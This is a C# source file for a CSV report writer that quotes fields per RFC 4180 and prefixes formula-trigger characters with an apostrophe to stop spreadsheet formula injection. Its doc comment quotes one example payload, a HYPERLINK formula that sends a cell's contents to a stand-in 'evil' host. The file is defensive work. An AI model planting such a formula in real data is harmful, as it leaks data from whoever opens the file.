using System.Globalization;
using System.Text;

namespace Bodega.Platform.Dashboard.Infrastructure.Reporting;

/// <summary>
///     Writes report rows as CSV that stays data when it is opened.
///
///     Two separate problems this replaces, both from building rows by plain
///     string interpolation:
///
///     Structure. A product called "Arroz, costal 50kg" put a bare comma in
///     the middle of a row, inventing a column and shifting every figure to
///     its right by one. A newline in a note did the same to rows. Fields are
///     quoted and embedded quotes doubled, per RFC 4180.
///
///     Execution. Product names, supplier names and movement notes are free
///     text typed by staff; the export is opened by the owner, in Excel. A
///     cell beginning with '=', '+', '-', '@' (or a tab/carriage return) is
///     read as a formula, so a product named
///     =HYPERLINK("http://evil/?d="&amp;A1,"ver") turns the owner opening their
///     own inventory report into a data exfiltration — a warehouse-role
///     employee attacking the one person whose role they can't otherwise
///     touch. Those fields get a leading apostrophe, which spreadsheets treat
///     as "this is text" and do not display as part of the value.
/// </summary>
public static class CsvWriter
{
    /// <summary>The characters a spreadsheet treats as "this cell is a formula" (OWASP CSV injection).</summary>
    private static readonly char[] FormulaTriggers = ['=', '+', '-', '@', '\t', '\r'];

    /// <summary>Builds one CSV line from already-ordered field values.</summary>
    public static string Row(params string[] fields)
    {
        return string.Join(",", fields.Select(Escape));
    }

    /// <summary>Convenience overload — formats with the invariant culture so a decimal comma never splits a column.</summary>
    public static string Row(params object?[] fields)
    {
        return string.Join(",", fields.Select(field => Escape(Format(field))));
    }

    private static string Format(object? field)
    {
        return field switch
        {
            null => string.Empty,
            string text => text,
            IFormattable formattable => formattable.ToString(null, CultureInfo.InvariantCulture),
            _ => field.ToString() ?? string.Empty
        };
    }

    private static string Escape(string field)
    {
        var builder = new StringBuilder(field.Length + 4);
        builder.Append('"');

        // Neutralise first, quote second: quoting alone does not stop a
        // spreadsheet from evaluating the cell's contents as a formula.
        if (field.Length > 0 && FormulaTriggers.Contains(field[0])) builder.Append('\'');

        foreach (var character in field)
        {
            if (character == '"') builder.Append('"');
            builder.Append(character);
        }

        builder.Append('"');
        return builder.ToString();
    }
}
